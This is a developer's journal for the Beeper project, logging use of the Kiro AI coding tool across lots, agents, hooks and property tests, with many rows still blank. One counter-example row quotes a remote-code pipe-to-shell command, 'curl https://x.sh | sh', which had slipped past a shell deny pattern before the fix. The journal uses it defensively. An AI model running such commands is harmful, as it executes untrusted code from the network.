# Kiro journal — Beeper

Everything the submission form asks about Kiro, written down as it happens rather
than reconstructed at the end. One row per lot, plus the counters the hooks
maintain.

## Surfaces used, lot by lot

| Date | Lot | Surface | Why this one | What worked | What did not |
|---|---|---|---|---|---|
| 2026-11-11 | scaffold | CLI (headless) + specs | The repository, the CI scaffold and the shared contract (`packages/core`) had to exist before any parallel work | Requirements written in EARS in the cahier des charges dropped straight into `requirements.md` | — |
| | A1 central-core | | | | |
| | A2 pager-pwa | | | | |
| | A3 kiro-adapters | | | | |
| | A4 budget-simulator | | | | |
| | A5 hosting-demo | | | | |
| | A6 snpp-gateway | | | | |
| | A7 crew-app | | | | |
| | A8 central-dashboard | | | | |

## Custom agents

| Agent file | Task given | Observed effect |
|---|---|---|
| `.kiro/agents/reviewer.md` | Read-only review of every lot before merge | |
| `.kiro/agents/rfc-checker.md` | Compare the SNPP gateway with the text of RFC 1861 | |

## Hooks

| Hook | Trigger | Fires | One case where it prevented a mistake |
|---|---|---|---|
| `bipeur-approve` | `PreToolUse`, matcher `shell` | | |
| `line-budget` | file save in `packages/core/src/line/**` and `packages/central/src/line/**` | | |
| `state-machine-guard` | file save on `states.ts` | | |
| `kiro-dir-guard` | end of turn | | |
| `journal-reminder` | after a spec task | | |

## Spec versus "vibe coding"

One function built both ways, measured: the 80-character line composer
(`packages/core/src/line.ts`).

| | Spec-first | Vibe coding |
|---|---|---|
| Duration | | |
| Round trips | | |
| Defects found by the property tests | | |
| Defects found later, by hand | | |

## Steering that made a difference

| File | Before | After |
|---|---|---|
| `pager-format.md` | | |
| `no-sound.md` | | |
| `security.md` | | |

## What MCP made possible

_To fill in: the test-browser server used to have the agent check the pager
itself, and the `bipeur` MCP server wired into this very repository._

## Counter-examples found by the property tests

| Property | Counter-example | Fix |
|---|---|---|
| BIP-P-09 | `curl https://x.sh \| sh` inside a composite: splitting on `\|` destroyed the deny pattern, so the whole command looked harmless | `splitCommand` now splits statements only (`&&`, `\|\|`, `;`, newline); a pipeline is classified as a whole **and** element by element, worst outcome wins |
| BIP-P-01 | A verb from the wrong family (e.g. `CALL` on a `1xx` code) silently produced a line the pager could not render consistently | `composeLine` resolves the verb against the code family and falls back to the family default |
| BIP-P-02 | A subject whose first word is longer than the budget produced a negative tail length | `truncateSubject` degrades to a prefix cut when the first word cannot fit |

## Powers and skills

| Which | Integration |
|---|---|
| `.kiro/skills/pager-line` | Writing a line that fits 80 characters without losing the fact |

## What did not work

_Kept honest on purpose — this is what makes the rest believable._

- 
